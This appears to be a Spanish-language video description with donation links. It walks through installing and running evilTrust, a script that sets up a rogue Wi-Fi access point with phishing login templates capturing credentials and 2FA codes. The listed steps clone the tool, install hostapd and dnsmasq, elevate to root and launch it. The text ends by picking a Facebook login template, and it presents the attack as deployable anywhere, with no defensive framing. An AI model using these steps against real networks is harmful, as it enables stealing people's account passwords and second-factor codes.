19.203 visualizaciones  24 dic 2021
Donaciones:
Paypal -  https://www.paypal.com/paypalme/jonat...
Cashapp - https://cash.app/$JohnFromIT404

evilTrust
Herramienta ideal para el despliegue automatizado de un Rogue AP con capacidad de selección de plantilla + 2FA.


Esta herramienta dispone de varias plantillas a utilizar, incluyendo una opción de plantilla personalizada, donde el atacante es capaz de desplegar su propia plantilla.


IMPORTANTE: No es necesario contar con una conexión cableada, por lo que es posible desplegar el ataque desde cualquier lado en cualquier momento.


- Instala la aplicacion
sudo git clone https://github.com/s4vitar/evilTrust.git


- Entra a la carpeta descargada
cd evilTrust


- Da los permisos necesarion a la aplicacion
sudo chmod +x evilTrust.sh


- Instala los requisitos
sudo apt-get install hostapd


sudo apt-get install dnsmasq


- Eleva tu cuenta 
sudo su


- Corre la aplicacion
./evilTrust.sh -m terminal


- Selecciona la interfaz adecuada de Wi-Fi
- Da un nombre a tu red inalambrica
- Selecciona un canal (Ejemplo: 7)
- Seleccionar una plantilla (Ejemplo: "facebook-login"